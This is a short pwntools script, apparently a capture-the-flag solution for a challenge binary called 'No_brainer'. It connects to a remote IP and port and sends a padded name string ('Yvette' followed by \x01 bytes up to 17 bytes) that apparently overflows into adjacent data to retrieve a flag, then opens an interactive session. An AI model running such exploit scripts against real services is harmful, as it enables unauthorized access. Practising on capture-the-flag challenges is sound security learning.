from pwn import *

r = remote('35.201.200.196', 33333)
# r = process('./No_brainer')

payload = b'Yvette' + b'\x01' * (17 - len('Yvette'))
raw_input()
r.sendlineafter(b'Guest Name: ', payload)
print(r.recvline())
# flag = r.recvline()
# log.info(f'Flag = {flag}')

# r.close()
r.interactive()